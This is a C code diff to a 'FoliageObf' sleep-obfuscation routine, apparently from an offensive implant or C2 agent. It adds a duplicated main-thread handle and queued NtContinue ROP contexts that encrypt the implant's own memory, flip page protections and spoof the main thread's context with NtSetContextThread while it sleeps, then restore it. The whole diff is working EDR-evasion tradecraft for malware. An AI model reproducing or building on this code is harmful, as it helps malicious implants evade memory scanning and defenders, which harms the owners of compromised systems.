@@ -22,20 +22,26 @@ FUNC VOID FoliageObf(
     
     LONG   Status     = 0x00;
 
-    HANDLE EvtSync     = NULL;
-    HANDLE hSlpThread  = NULL;
-    HANDLE hMainThread = NULL;
+    HANDLE EvtSync       = NULL;
+    HANDLE hDuplicateObj = NULL;
+    HANDLE hSlpThread    = NULL;
+    HANDLE hMainThread   = NULL;
 
     PVOID  OldProt    = NULL;
 
     CONTEXT CtxMain   = { 0 };
+    CONTEXT CtxBackup = { 0 };
+    CONTEXT CtxSpoof  = { 0 };
 
     CONTEXT RopSetEvt = { 0 };
     CONTEXT RopProtRw = { 0 };
     CONTEXT RopMemEnc = { 0 };
+    CONTEXT RopGetCtx = { 0 };
+    CONTEXT RopSetCtx = { 0 };
     CONTEXT RopDelay  = { 0 };
     CONTEXT RopMemDec = { 0 };
     CONTEXT RopProtRx = { 0 };
+    CONTEXT RopFixCtx = { 0 }; 
     CONTEXT RopExit   = { 0 };
 
     //HeapObf();
@@ -44,6 +50,8 @@ FUNC VOID FoliageObf(
     if ( Status != 0x00 ) {
         //PrintErr( "NtCreateEvent", Status );
     }    
+
+    Instance()->Win32.DuplicateHandle( NtCurrentProcess(), NtCurrentThread(), NtCurrentProcess(), &hDuplicateObj, THREAD_ALL_ACCESS, 0, 0 );
 
     Status = Instance()->Win32.NtCreateThreadEx( &hSlpThread, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(), NULL, NULL, TRUE, 0, 0x1000 * 20, 0x1000 * 20, NULL );
     if ( Status != 0x00 ) {
@@ -63,9 +71,12 @@ FUNC VOID FoliageObf(
     MmCopy( &RopSetEvt, &CtxMain, sizeof( CONTEXT ) );
     MmCopy( &RopProtRw, &CtxMain, sizeof( CONTEXT ) );
     MmCopy( &RopMemEnc, &CtxMain, sizeof( CONTEXT ) );
+    MmCopy( &RopGetCtx, &CtxMain, sizeof( CONTEXT ) );
+    MmCopy( &RopSetCtx, &CtxMain, sizeof( CONTEXT ) );
     MmCopy( &RopDelay,  &CtxMain, sizeof( CONTEXT ) );
     MmCopy( &RopMemDec, &CtxMain, sizeof( CONTEXT ) );
     MmCopy( &RopProtRx, &CtxMain, sizeof( CONTEXT ) );
+    MmCopy( &RopFixCtx, &CtxMain, sizeof( CONTEXT ) );
     MmCopy( &RopExit,   &CtxMain, sizeof( CONTEXT ) );
 
     /* 
@@ -95,6 +106,21 @@ FUNC VOID FoliageObf(
     RopMemEnc.Rcx = Instance()->Base.Buffer;
     RopMemEnc.Rdx = Instance()->Base.FullLen;
 
+    /* stack duplication
+     * NtGetContextThread( hDuplicateObj, CtxBackup );
+     */
+    RopGetCtx.Rip = Instance()->Win32.NtGetContextThread;
+    RopGetCtx.Rcx = hDuplicateObj;
+    RopGetCtx.Rdx = &CtxBackup;
+
+    /*
+     * 
+     * NtSetContextThread( hDuplicateObj. CtxSpoof );
+     */
+    RopSetCtx.Rip = Instance()->Win32.NtSetContextThread;
+    RopSetCtx.Rcx = hDuplicateObj;
+    RopSetCtx.Rdx = &CtxSpoof;
+
     /*
      * delay
      * WaitForSingleObjectEx( NtCurrentProcess(), SleepTime, FALSE );
@@ -111,6 +137,15 @@ FUNC VOID FoliageObf(
     RopMemDec.Rip = Instance()->Win32.SystemFunction041;
     RopMemDec.Rcx = Instance()->Base.Buffer;
     RopMemDec.Rdx = Instance()->Base.FullLen;
+
+    /*
+     * 
+     * NtSetContextThread( hDuplicateObj, &CtxBackup );
+     */
+
+    RopFixCtx.Rip = Instance()->Win32.NtSetContextThread;
+    RopFixCtx.Rcx = hDuplicateObj;
+    RopFixCtx.Rdx = &CtxBackup;
 
     /*
      * change memory to execute and read
@@ -132,9 +167,12 @@ FUNC VOID FoliageObf(
     Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopSetEvt, FALSE, NULL );
     Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopProtRw, FALSE, NULL );
     Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopMemEnc, FALSE, NULL );
+    Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopGetCtx, FALSE, NULL );
+    Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopSetCtx, FALSE, NULL );
     Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopDelay , FALSE, NULL );
     Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopMemDec, FALSE, NULL );
     Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopProtRx, FALSE, NULL );
+    Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopFixCtx, FALSE, NULL );
     Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopExit  , FALSE, NULL );
 
     Status = Instance()->Win32.NtAlertResumeThread( hSlpThread, NULL );
@@ -142,9 +180,12 @@ FUNC VOID FoliageObf(
         //PrintErr( "NtAlertResumeThread", Status );
     }
 
+    CtxSpoof.Rip = Instance()->Win32.WaitForSingleObjectEx;
+    //CtxSpoof.Rsp = Instance()->Teb->NtTib.StackBase;
+
     Instance()->Win32.printf( "[I] Trigger sleep obf chain\n\n" );
 
-    Status = Instance()->Win32.NtSignalAndWaitForSingleObject( EvtSync, hSlpThread, TRUE, NULL );
+    Status = Instance()->Win32.NtSignalAndWaitForSingleObject( EvtSync, hSlpThread, FALSE, NULL );
     if ( Status != 0x00 ) {
         //PrintErr( "NtSignalAndWaitForSingleObject", Status );
     }
@@ -269,7 +310,14 @@ FUNC VOID CfgPrivateAddressAdd(
     }
 }
 
-FUNC VOID XorCipher(IN PBYTE pBinary, IN SIZE_T sSize, IN PBYTE pbKey, IN SIZE_T sKeySize) {
+
+
+FUNC VOID XorCipher(
+    IN PBYTE pBinary, 
+    IN SIZE_T sSize, 
+    IN PBYTE pbKey, 
+    IN SIZE_T sKeySize
+) {
     for (SIZE_T i = 0x00, j = 0x00; i < sSize; i++, j++) {
         if (j == sKeySize)
             j = 0x00;
